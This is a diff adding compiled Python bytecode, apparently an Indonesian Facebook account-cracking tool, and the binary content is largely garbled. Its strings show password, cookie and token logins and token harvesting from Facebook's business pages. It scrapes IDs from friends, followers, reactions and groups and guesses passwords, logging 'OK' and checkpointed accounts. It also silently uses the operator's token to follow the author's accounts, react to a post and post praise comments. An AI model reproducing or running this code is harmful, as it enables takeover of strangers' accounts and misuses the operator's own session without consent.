@@ -1,0 +1,1313 @@
+�
+Kޅac@s�dZdZdZdZdZdZdZdZdd  lZydd  l  Z
+Wn<ek
+r�ed
+GHejej
+dkr�dnd
+�nXyddlmZWn<ek
+r�edGHejej
+dkr�dnd�nXydd  lZWn<ek
+r,edGHejej
+dkr"dnd�nXdd  ladd  lZdd  lZdd  lZdd  lZdd  lZdd  lZdd  lZddlmZddl  mZddlmZdd  lZddlmZddlmZdZdadZ gZ!gZ"gZ#gZ$ga%gZ&ga'gZ(gZ)da*ededeZ+y#ej,e �j-�Z.e.dZ/Wn'ej0j1k
+r�ed GHe2�nXgZ3ga4gZ5gZ6gZ7gZ8gZ9y$e:d!d"�j;�e3j<d#�Wne=k
+r�nXd$d%d&d'd(d)d*gZ>d+�Z?d,Z@d-ZAd.�ZBd/�ZCd0�ZDd1�ZEd2�ZFd3�ZGd4�ZHid5d66ZId7�ZJd8�ZKd9�ZLgZMd:�ZNd;ZOd<�ZPd=�ZQd>�ZRd?�ZSd@�ZTdA�ZUdd  lVZVeWej��jX�ZYeVjZeY�Z[eVj\e[�Z]yae:dBd"�j;�Z^e^j_dCdD�Z`e`jadE�de`jadE�dFZbebZcecZdedZeWn�e=k
+r�n�efk
+rBe:dBdG��ZgegjhdEe]�Wd  QXyae:dBd"�j;�Z^e^j_dCdD�Z`e`jadE�de`jadE�dFZbebZcecZdedZeWnefk
+r>nXnXyYe:dHd"�j;�Zieij_dIdJ�j_dKdL�ZjdMejdNdOe]ZkekZlelZmWne=k
+r�nXdP�ZngaodQ�ZpdR�ZqdSardT�ZsdU�ZtdSardaudV�ZvgZwdW�ZxdX�Zydd  ladd  lZdd  lZdd  lZdd  lZdd  lZdd  lZddlmZddl  mZddlmZdd  lZddlmZdY�ZzdZ�Z{d[�Z|d\a}d]�Z~d^�Zd_�Z�ga�d`�Z�gZ�gZ�gZ�gZ�gZ�gZ�gZ�da�Z�gZ�gZ�gZ�db�Z�ga�ga�edDZ�dc�Z�dd�Z�gZ�de�Z�df�Z�dg�Z�dh�Z�di�Z�dj�Z�dk�Z�dl�Z�dm�Z�dn�Z�dd  lVZVdd  lZdo�Z�e�dpkr�dd  ladd  lZdd  lZdd  lZdd  lZdd  lZdd  lZddlmZddl  mZddlmZdd  lZddlmZe��e:dqd"�j;�a�e�t��nd  S(rs[90;1ms[91;1ms[92;1ms[93;1ms[94;1ms[95;1ms[96;1ms[97;1mi����Ns#
+ Modul Futures blom terinstall!...tntspip install futuresspip2 install futures(t
+BeautifulSoups
+ Modul bs4 blom terinstall!...spip install bs4spip2 install bs4s$
+ Modul Requests blom terinstall!...spip install requestsspip2 install requests(tThreadPoolExecutor(tThread(tdate(t
+monthranges<https://graph.facebook.com/id_saya/subscribers?access_token=shttps://m.facebook.comshttps://www.httpbin.org/ipit+s>>>--torigins#
+ [!] Tidak ada Koneksi Internet..
+s
+ua_dev.txttrtdev_ids�Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]s�[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]sDalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]s�Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]s�Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3s
+Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]s�Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]cCs�tGHtdtdGHtdtdGHtGHtdtdtdtdGHtdtd  tdtd
+GHtdtdtdtdGHtdtd
+tdtdGHtdtdtdtdGHtdtdtdtdGHtdtdtdtdGHtdtdtdtdGHtGHttdtdt�}tdtd}tdtd}|dkr*tGHttdtdtd�}|GHtdd ��}|jd!�WdQXtd"d ��B}|j|�tt  �d#krt
+jd$�n|GHt�WdQXn�|dkr�|td%GHtdd ��}|jd%�WdQXtd"d ��F}|jt
+d&�tt  �d#kr�t
+jd$�n|GHt�WdQXn�|d  krZ|td'GHtdd ��}|jd'�WdQXtd"d ��F}|jt
+d#�tt  �d#krEt
+jd$�n|GHt�WdQXnf|dkr�|td(GHtdd ��}|jd(�WdQXtd"d ��F}|jt
+d)�tt  �d#kr�t
+jd$�n|GHt�WdQXn�|d
+kr�|td*GHtdd ��}|jd*�WdQXtd"d ��F}|jt
+d+�tt  �d#krut
+jd$�n|GHt�WdQXn6|dkr"|td,GHtdd ��}|jd,�WdQXtd"d ��F}|jt
+d-�tt  �d#kr
+t
+jd$�n|GHt�WdQXn�|dkr�|td.GHtdd ��}|jd.�WdQXtd"d ��F}|jt
+d/�tt  �d#kr�t
+jd$�n|GHt�WdQXn|dkrR|td0GHtdd ��}|jd0�WdQXtd"d ��F}|jt
+d1�tt  �d#kr=t
+jd$�n|GHt�WdQXnntt  �d#kr�tdtd2tdtd3td4GHn0tdtd2tdtd3td4GHt�dS(5Ns
+   *s Setting User-Agents   ?s
+ Hp Kamu Apa?s [t1t]s Xiaomit2s Vivo t3s   SAMSUNG t4s OPPO t5s Realmi t6s iPhone t7s ASUS t8s Masukkan User-Agent Manual s [?]s Pilih? s
+ >_<s Sukses Setting User-Agent s+>> sJalankan lagi Toolsnya!s Masukkan User-Agents: shp.txttwsSetingan Manuals
+ua_dev.txtitIqbalDevtXiaomiitVivotSAMSUNGitOPPOitRealmiitiPhoneitASUSit*s Menggunakans User-Agent Bawaan Tool (tgaristktptht  raw_inputtatopentwritetlentpil_uatua_hptappendtexittuser_agent_dev(tpiltsuksestjalankantuatuwttul((s
+premium.pyt__seting_ua_dev___s�!!!!!!!! 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+))s�https://m.facebook.com/v8.0/dialog/oauth?cct_prefetching=0&client_id=1591956834435357&cbt=1622137477843&e2e=%7B%22init%22%3A1622137477843%7D&ies=1&sdk&_rdrsjhttps://m.facebook.com/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv6.0%2Fdialog%2Foauth%3Fclient_id%3D2036793259884297%26cbt%3D1622205732064%26e2e%3D%257B%2522init%2522%253A1622205732064%257D%26ies%3D1%26sdk%3Dandroid-6.3.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D%26default_audience%3Dfriends%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4da6f37f-2993-49cd-b08c-11e3de85d49c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=https%3A%2F%2Fm.facebook.com%2Fv6.0%2Fdialog%2Foauth&_rdrcCs0tGHtdtdGHtdtdGHtGHtdtdtdtdGHtdtd  tdtd
+GHtGHttdtdt�}|dkr�ytjd
+dtg�WntdttGHnXt  �nR|d  kr%ytjd
+dt
+g�WntdttGHnXt  �nt  �dS(Ns
+   *s! Buka Halaman Login GAME lewat FBs   s$+----------------------------------+s [R
+Rs& Buka Halaman Login Free Fire Lewat FBRs+ Buka Halaman Login Mobile Legend Lewat FB s [?]s Pilih? tamtstarts Link Login ==> (RRRR R!R"t
+subprocesstcheck_outputt
+__ff_dev__R)t
+__ml_dev__(R+((s
+premium.pyt__seting_login_fb_game__�s*!!
+
+cCstd�dS(Ns
+ Keluar..
+(R)(((s
+premium.pytkeluar�scCs&tjtjdkrdnd�dS(NRtclstclear(tostsystemtname(((s
+premium.pyt  clear_devscCs&tjtjdkrdnd�dS(NRs
+del cokie.txtsrm -rf cokie.txt(R<R=R>(((s
+premium.pythapus_cokiescCs&tjtjdkrdnd�dS(NRsdel cookie.txtsrm -rf cookie.txt(R<R=R>(((s
+premium.pythapus_login_cookiescCsdy&tjtjdkrdnd�WnnXy&tjtjdkrNdnd�WnnXdS(NRs
+del token.txtsrm -rf token.txtsdel cookie.txtsrm -rf cookie.txt(R<R=R>(((s
+premium.pythapus_data_logins&&cCs&tjtjdkrdnd�dS(NRspremium.pycspython2 premium.pyc(R<R=R>(((s
+premium.pyt
+jalankan_toolss�Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36s
+user-agentc  Cs�tGHtdtdGHtdtdGHtdtdGHtGHttd�}|dkrcg}y�td  td
+tdGHtdd
+�j�}dGHtdd��}|jd�WdQXx_t|�D]Q}dt|j  dd�GHtdd��}|j|�WdQX|j
+|�q�Wtdttt|��GHg}Wnt
+dtdGHnXdGHn|dkr>g}y�td  tdtdGHtdd
+�j�}tdGHx@|D]8}dt|j  dd�j  dd�GH|j
+|�q�Wtdttt|��GHg}Wq�tk
+r:t
+dtdGHq�XnB|dkrytGHtdt
+dtd GHtdt
+dtd!GHtGHttd�}|dkrttd"td#�}|d$krvy+tjtjd%kr�d&nd'�d(GHWqd)GHqXqvq�|dkr�ttd*td#�}|d$krvy+tjtjd%krTd+nd,�d(GHWqsd-GHqsXqvq�nt�dS(.Ns 1. sCek Hasil OKs 2. sCek Hasil CPs 3. sHapus Hasil CP/OKs>>> R
+s >_<s   Hasil OKs>>>shasil_ok.txtRtRs   s
+R"s
+  >_ Jumlah OK: s
+   X sBlom ada hasil OKRs   Hasil CPshasil_cp.txts
+   Tgl Crack s==>t s
+  >_ Jumlah CP: sBlom ada hasil CPR
+sHapus sHasil OKsHasil CPs
+ Yakin mau Hapus Hasil OK ? s[y/n]: tyRsdel hasil_ok.txtsrm -f hasil_ok.txts
+
+ Sukses.....s
+ Belum ada Hasil OKs
+ Yakin mau Hapus Hasil CP ? sdel hasil_cp.txtsrm -f hasil_cp.txts
+ Belum ada Hasil CP(RRRR!R R#t  readlinesR$tsettreplaceR(tstrR%tmtIOErrorR"R<R=R>R)(  R+toketoktokehtdevtcpetcptpilih_kuty_n((s
+premium.pyt  cek_hasils�
+  
+%
+
+"  "  cCs�d}tj���}idj|�d6dd6}d|krUi|d6dd6}n|j|d|�j}t|d�}|jd  d
+d�}|ja|dkr�danWdQXdS(
+Nshttps://lookup-id.com/#shttps://m.facebook.com/{}tfburltLookuptchecktfacebooktdatashtml.parsertspantidtcodetme(  trequeststSessiontformattposttcontentRtfindttexttuser_get_id(tusernameturlRPtpayloadtdata_devtsop_tid_((s
+premium.pyt__get_id_dev__^s  cCs�tdd�j�}dj||�}tj���}y{|j|�j�}tj|dd|d�t  dt
+dt  d  t
+d
+tdtt
+t��Gtjj�WnnXWdQXdS(Ns  token.txtRs-https://graph.facebook.com/{}?access_token={}R\RER>s
+ [RRs
+ Mengambil IDs: (R#treadRaR_R`tgettjsontuser_idR(R RRRJR%tsyststdouttflush(tuserttokenRhtdev_RZ((s
+premium.pyt__get_data_user__ls8c
+Cs�tj���}|jdd|�j}t|d�}dt|�kr�y|t|d�jd�}|d}i}x0|D](}|}|jd�||jd�<qzW|jd|d  |d|�Wq�q�XnWdQXyNt|d�}  |  jd
+dd�}
+d|
+d
+}|j|d|�j}WnnXtt  �dkr�ygd}
+|j|
+d|�j}t|d�}|jd
+dd�}d|d
+}|j|d|�Wq�q�XndS(Nshttps://mbasic.facebook.comtcookiesshtml.parserszero/optin/legal/tformtactiontvalueR>RZR"tstringsBahasa Indonesiathrefis0https://mbasic.facebook.com/jangan.macem.macem.2tIkuti(
+R_R`RoRcRRJRdRbR%tikuti_(t
+cookie_devtses_pros_devtproses_masuktsoptsop_grturl_postRiRPtinputtdev_soptsop_uwut  ambil_urlthastuwu_utikuttsop_devtambilRZ((s
+premium.pyR�ys>
+
+ !
+t510375576819453c  Cs�dt}tj���}|j|d|�j}t|d�}|jd�}xZ|D]R}dt|�krrPndt|�krV|d}|jd|d|�qVqVWWdQXdS(  NsChttps://mbasic.facebook.com/reactions/picker/?is_permalink=1&ft_id=Ryshtml.parserR"s(Hapus)tSuperR~shttps://mbasic.facebook.com(tid_postR_R`RoRcRtfind_allRJ(tcookieturl_lovetr_devthal_loveR�turl_lovtiqtu_love((s
+premium.pytlove�s
+
+
+c
+Cs�ddg}tj��{}|jdtd|�x'|D]}|jdj||��q;W|jdjtjdddg�|��g}WdQXdS(  Nt100038019723653t
+1417141901shttps://graph.facebook.com/s"/reactions?type=LOVE&access_token=s9https://graph.facebook.com/{}/subscribers?access_token={}t100001027764318t100045387495929t100040248105716(R_R`RbR�Ratrandomtchoice(Rvtlis_id_follRwtid_follR�((s
+premium.pyt
+love_token�s
++c
+Csuxntd�D]`}tj��L}tjdddddddg�}|jd  td
+|d|�WdQXq
+WdS(NisToolsnya MantapsGw Fans Lu BangsGimana Kabarnya Bang?s
+Hallo bangsKeren Bos..sThanks bang Toolsnyas6Gak sia2 saya make tool abang, Keren Abis, Ga ada Obatshttps://graph.facebook.com/s/comments/?message=s&access_token=(trangeR_R`R�R�RbR�(RvRPRwtkomen_((s
+premium.pytkomen�s$cCs�y�idd6dd6}tjdd|d|�j}tjdt|��d  }d
+tdt|GHtdd
+��}|j  |�WdQXWn t
+dGHt
+dGHt�nXdS(NslMozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36s
+user-agents#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7saccept-languages0https://business.facebook.com/creatorstudio/hometheadersRys0{"userAccessToken":"(.*)","rightsManagerVersion"is
+ [*] sToken FB Kamu: s  token.txtRs<
+ [!] Gagal Ambil Token, Jangan Login fb Dalam mode Gratis!
+s [!] Login Mengguanakn Token 
+(R_RoRctretfindallRJRtdR#R$RR)(R�theaderzthalamant  token_devR0((s
+premium.pyt__token__dev�s
+    c
+Cs�y�tdGHtGHtdttGHtGHttdtdtdtdtd�}ttdtdtdtdtd�}d  }tj��  }|j  |�j
+}t|d
+�}|jddd
+�}|d}t
+j
+�a
+|jjidd6t|d6dd6dd6dd6dd6dd6|jddidd6�d d!6�i|d"6d#jtt
+�|�d$6}x0|D](}  |  }
+|
+j  d �||
+j  d�<q{W|jt|d%|d&t�j}d'|kritd(td)GHy|j�}|j�}
+x=|
+D]5}td*d+��}|jt|d,��WdQXqWtd*d-�j�d.jd,�}td*d-�j�d/jd,�}td*d-�j�d0jd,�}td*d-�j�d1jd,�}i|d'6|d26|d36|d46}Wntd5�nXtd6td7GHt|�t|�td8d-�j �}td9td:td;td<tGHt�n5d=|kr�td>GHtd?�nt!d@GHtd?�WdQXWn&tj"j#k
+r�dAGHtd?�nXdS(BNs#
+
+      L O G I N  F A C E B O O K s      IP Sekarang: s [tLoginRs Masukkan Username:REs Masukkan Password:shttps://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221aftew690wwti1dt2dpc1hekoyw1kx6wd6a5ivz72212fnl11gpi%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De7aff248-989f-4b4f-9e41-1f437903a29c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221aftew690wwti1dt2dpc1hekoyw1kx6wd6a5ivz72212fnl11gpi%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdrshtml.parserRzR\t
+login_formR{s�Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36s
+user-agenttreferersm.facebook.comtHosts*/*taccepts?1ssec-ch-ua-mobilesgzip, deflate, brsaccept-encodingsid,en-US;q=0.9,en;q=0.8saccept-languageR�tattrstlsdR>R|sx-fb-lsdtemails#PWD_BROWSER:0:{}:{}tpassRZtallow_redirectstc_users
+ >_<s Login Sukses...
+s
+cookie.txtR"s
+Riiiitfrtxstsbs
+ Kesalahan di Cookie!
+s!
+ Login Sukses....
+ Tunggu Prosess--->>> s  token.txts
+ [!]s Jalankan lagi Toolsnyas..!
+ Ketik Perintah spython2 premium.pyc
+t
+checkpoints
+ Akun Cekpoin...s  
+ Keluar
+s
+ Login Gagal...s
+ Periksa Koneksi Internet!($R RRRtipR!R�R_R`RoRcRRdttimeR�tupdatetfbRatintRbtFalseRytget_dicttvaluesR#R$RJRGtstripR)R�R�RnRKt
+exceptionstConnectionError(tem_devtsan_devturl_page_logtses_devtpage_devR�tform_devR�Rit
+dev_get_inputR�t  login_devt  cokie_logt  nilai_cokRPtus_psR�R�R�R�R�Rv((s
+premium.pytlogin_dengan_passwod�s|  00
+%
+ "
+!""""
+
+
+%
+  
+  c  CszdGHtGHtdtdGHtGHttdtdtdtdtd�}td  d
+��}|j|�WdQXtd  d�j�}i|d6}tj  ��}|j
+td
+|�j}WdQXd|kr9tdtdGHt
+|�t|�tdd�j�}tdtdtdtdtGHt�n=d|kr_tdGHt�t�ntdGHt�t�dS(NRDs   L O G I N  D E N G A N s C O O K I Es [tcokiRs Masukkan Cookies: s
+cookie.txtRRR�Rytmbasic_logout_buttons!
+ Login Sukses....
+ Tunggu Prosess-->>> s  token.txts
+ [!]s Jalankan lagi Toolsnyas..!
+ Ketik Perintah spython2 premium.pycR�s
+ Akun Cekpoins
+ Cookie Salah(RRR R!RR#R$RnR_R`RoR�RcR�R�R)RAR9RK(tcok_int
+cookie_simpantfile_cokR�R�tloginRv((s
+premium.pytlogin_dengan_cookie_s20
+
+
+%
+  
+  s  cokie.txtt|RDsA+ZZiR"s
+cokiez.txtR
+Rt0Rt80t04tlcCs�y�dGHtGHtdtdGHtGHttdtdtdtdtd�}td  d
+��}|j|�WdQXt�tdtdGHtd
+tdGHt�Wnt  k
+r�t
+�nXdS(NRDs   L O G I N  D E N G A N s
+ T O K E Ns [RvRs Masukkan Tokens: s  token.txtRs
+ ++++>s  Login Sukses....s*
+ Jalankan Lagi Toolsnya!
+ Ketik Perintah spython2 premium.pyc
+(RRR R!RR#R$t  cek_tokenR)tKeyboardInterruptR9(ttok_inttulis((s
+premium.pytlogin_dengan_tokenYs0
+c
+s�d}yGtt�dkr�g}g}dGHx0|D](}tj��}y|jdj||��j�}t|d�dkr�w3nx9|dD]-}y|j|d|d�Wq�q�Xq�W|j|�tdt  t
+|�td  td
+t  |tdtdt  t
+t|��GH|d7}g}t|�d
+krJPnWnnXWdQXq3Wt}  x�|  ryyt
+GHttdtdtdtdtd�}
+x=tdt|�d�D]"}t|
+�|kr�t}  Pq�q�WWqhtk
+rt�qhqhXqhWd}t|�}
+xF|D]>}|
+t
+|�krY|j|�}||}n|d7}q%Wtdtdtdtdtd|GHntj��Y}|jdj||��j��tdtdtdtdtd�dGHWdQXdj||�}dj||��|}���fd���|�dGHWn=tk
+rldGHt�n!tk
+r�tdGHt�nXdS(NiRDs@https://graph.facebook.com/{}/friends?limit=5000&access_token={}RZiR>R\s [s] sID: s | sTeman: it?Rs Pilihs: s
+ [Rs IDs-https://graph.facebook.com/{}?access_token={}s Mengambil ID TemansXhttps://graph.facebook.com/{}/friends?fields=name,id,birthday&limit=1000&access_token={}c
+s7tj��%}y6|j|�j�}|d}gatjd�Wn1tt�dkr`qy|j��j�}nXt|d�dkr�tdt�dGHtdGHt  �nxM|dD]A}y t
+tkr�PnyQtj
+td�}tjt|d�d  t|d
+�dt|d��WnPy?tj
+td�}tjt|d�dt|d��WqqXnXtj
+td�}tdtd
+tdtddjt�td|ttt��Gtjj�Wq�tk
+r�Pq�q�Xq�Wy|dd}�|�WnnXWdQXdS(NRZs
+[96;1m + TTLis!
+ [x] Tidak Bisa Mengakses Data: R>s [x] Coba cari Akun yg lainnya!RDR\s>>>tbirthdayREs
+ [RRs
+ Mengambil IDs: tpagingtnext(R_R`RoRptttl__R(R%RKRR)RFtztteRIRqRJR RtjoinRrRsRtR�(tlinktses_RZtiqbalRPttR�(tlink_tnamatsub_teman_teman(s
+premium.pyR��sN
+  
+?-I
+s# [x] Masukkan ID Target yg Benar!..s
+ [x] Token Error(R%t
+cari_temanR_R`RoRaRpR(R RRJRtTrueRR!R�R�R�R�R)tindextKeyErrorRLRK(RvRutcountttamttampilRPR�t
+lihat_dataRwtpilih_R+titcotjmtcoltuser_R�R�R((R�R�R�s
+premium.pytteman_teman_ksz
+!
+S
+  0 
+
+
+
+0!70
+  
+
+
+  c
+Cs�yegatj��Y}|jdj||��j�}tdtdtdtdtd|dGHWdQXdj||�}d  j||�}tj  td
+�}tj���}y0|j|�j�}|d}tj
+d�Wn|j|�j�}nXt|d�d
+kr-tdGHt
+�nx)|dD]}  y�tj  td
+�}y?tj
+t|  d�dt|  d�dt|  d��Wn>y-tj
+t|  d�dt|  d��Wq�q�XnXtdtdtdtdtd|ttt��Gtjj�tjd�ttkr9PnWq8tk
+rNPq8q8Xq8Wd
+GHWdQXWnCtk
+r�dGHt
+�n'tk
+r�tdGHt
+�nnXdS(Ns-https://graph.facebook.com/{}?access_token={}s [RRs Mengambil Data Followerss: R>s\https://graph.facebook.com/{}/subscribers?fields=name,id,birthday&limit=5000&access_token={}sDhttps://graph.facebook.com/{}/subscribers?limit=5000&access_token={}RDRZs + TTLis [x] Tidak ada Pengikut..R\s>>>R�REs
+ [s Mengambil ID Followersg����MbP?s# [x] Masukkan ID Target yg Benar!..s
+ [x] Token Error(R�R_R`RoRaRpR RR�RIR(R%RKR)RqRJRRrRsRtR�tsleepRFR�R�R�RL(
+RvRuR�R�Rhturl_R�RZR�RP((s
+premium.pytpengikut�s\!7
+  
+?-<
+
+
+
+
+
+  
+ic
+Cs3gadj||�}tj��  }|j|�j�}t|d�dkretdGHt�nx�|dD]�}y�t  j
+t  d�}tjj
+tdtdtdtd  t|d
+ttt���ttkr�Pny-tjt|d�dt|d
+��WnnXWqpqpXqpWWdQXdS(Ns@https://graph.facebook.com/{}/likes?limit=100000&access_token={}RZis
+ Tidak Bisa Mengakses Data..RDs
+ [t$Rs Mengambil User IDs: R\RER>(R�RaR_R`RoRpR%RKR)R�RIRrRsR$R RRR"RJRqRFR�R((Rvtid_liketurl_likeR�thal_likeRPR�((s
+premium.pytlikezs&  
+H-cCs�d}dtd}dj|�}tj��.}|j|d|�j}t|d�}WdQXdt|�kr�dGHt�n|j  d  �}x|D]}  x�|  j  d
+�D]�}
+y�|
+j
+}|
+djdd
+�jd�}t
+jt
+d
+�}
+tjjtdtdtdtdt|
+dt|��ttkrAPny%tjt|�dt|��WnnX|d7}Wq�tk
+r�q�q�q�Xq�Wq�WdS(Nishttps://graph.facebook.com/s!/likes?limit=100000&access_token=sohttps://mbasic.facebook.com/ufi/reaction/profile/browser/fetch/?limit=3000&total_count=282&ft_ent_identifier={}Ryshtml.parsersOrang yang menanggapisH
+ Maaf ID Tidak bisa dijangkau,
+ Silahkan Masukkan ID Postingan yg Lain
+th3R"R~sprofile.php?id=RDs/&?s
+ [R  Rs Mengambil User IDs: RE(tidtRaR_R`RoRcRRJR
+R�ReRIR�R�RrRsR$R RRR"RFR�RqR(tUnicodeEncodeError(R�R
+tctURLRR�RR�treactRPtuwuR�RuR�((s
+premium.pytlikezzzzzzz*s8
+
+  B%
+c
+CsTxM|tkrOtj��/}|j|d|�jjd�}t|d�}|jd�}x�|D]�}y�|jddt  �d}d|kr*t
+jt
+d  �}  |jd
+d  �jdd�}
+|
+j�d
+}t
+tkr�Pnytjt|��WnnXtd7att�|dkr-Pq-nwdWqdqdqdXqdWtt�dkr�tt�d
+krptdGHPnttt�t�t�dGtGtdGHt�ntdd��}|jtt�gaWdQXdt|�kr|jddd�}|d}t |||�ntdd��}|jtt�gaWdQXWdQXqWdS(NRysutf-8shtml.parserttbodyR"tclass_R~t
+add_friendRDs$/a/mobile/friends/add_friend.php?id=t&REiis*
+ Tidak ada daftar Orang yg Di temukan...
+s
+sDone...tmax_workersisLihat Hasil SelanjutnyaR}(!RR_R`RoRetencodeRR�RdR�R�RItsplitRFR�t  data_userR(RJR%RqR�RKRRvt  sandi_devt__pilih_crack__RRR)RtmapRxt
+cari_orang(
+tjumlahtu_orangR�R�t  hal_orangR�tcariRPR�R�tid_devtus_tdev_x((s
+premium.pyR!KsV!
+
+  
+
+
+cCsNdj|�}tj���}|j|�j�}x�|dD]�}y�tdtdtdtdtd|djd  �GHtdtdtdtd
+td|dGHdGHt  j
+t  d�}tj|d�t
+tkr�PnWq>q>Xq>WWdQXtGHxCtD];}y d
+j|�}tt|�Wqtk
+rEPqXqWdS(Ns4https://graph.facebook.com/me/groups?access_token={}RZs [RRs
+ Nama Grups: R>sutf-8s ID GrupR\RDs7https://mbasic.facebook.com/browse/group/members/?id={}(RaR_R`RoRpR RRRR�RItid_grupR(RFR�RtgrupR�R�(RvRhR�RZRPR�turl_grup((s
+premium.pytmy_grup�s*:1
+
+c
+
+Csntj��\}yK|j|d|dt�j}t|d�}|jddd�}x�|jd�D]�}|djdd  �}t  j
+d
+t|��d}y%tj
+t|�dt|��WnnXtd
+tdtdtdtdttt��Gtjj�qdWdt|�krY|jddd�d}  d|  }t||�nWnnXWdQXdS(NRyR�shtml.parsertdivR\tobjects_containerttabletmember_RDs <img alt="(.*), profile picture"iREs
+ [RRs Mengambil 100+ ID Per Grups: sLihat SelengkapnyaR"R}R~shttps://mbasic.facebook.com(R_R`RotheaderRcRRdR�RIR�R�RJRR(R RRR%RrRsRtR*(
+R�R+R�RZR�tmembersRPRtnama_Rh((s
+premium.pyR*�s(%8
+c
+Cs�gattdtdtdtdtd�}xtrCy�ttkrRPntdtdtdtdtdGHtd  td
+tdtdGHtd  tdtdtd
+GHt  GHttd  tdtdtdtd�}|dkrd}Pn,|d
+krd}Pn|dkr4d}PnWq9Pq9Xq9Wt
+td  tdtdtdtdt�}|j�}t|�dkr�xt
+d|ddd�D]�}y�tjtd�}tjt|d�t|�|dt|d��tjt|d|d�t|�|dt|ddt|d���dtdtdtdtdjtt��Gtjj�Wq�q�Xq�Wnt|�dkr�x(t
+d|ddd�D]}y�tjtd�}tjt|d�t|�|dt|d��tjt|d|d|d�t|�|dt|ddt|ddt|d����dtdtdtdtdjtt��Gtjj�Wq�q�Xq�Wnt|�dkr�|j�}|jdd�}x�t
+d|d�D]�}y�tjtd�}tjt|�t|�|dt|d��dtdtdtdtdjtt��Gtjj�Wq(q(Xq(Wnt|�dkr~x�t
+d|d�D]�}yytjtd�}tj|t|�|d|�dtdtdtdtdjtt��Gtjj�Wq�q�Xq�WndS(Ns
+ [R�Rs Cari Orangs: R
+s @email.coms Pros [Rs @gmail.comR
+s @yahoo.coms
+ Pilih Domains
+@email.coms
+@gmail.coms
+@yahoo.comR  s Masukkan JumlahiiRDiREs
+ [s
+ Mengambils {} [96;1mID i(R�R!R RR�RFR�RR"RR�RR%R�R�RIRqR(RJRaRrRsRt(R�R+tdomaintjmltnamRPR�tpw((s
+premium.pyt
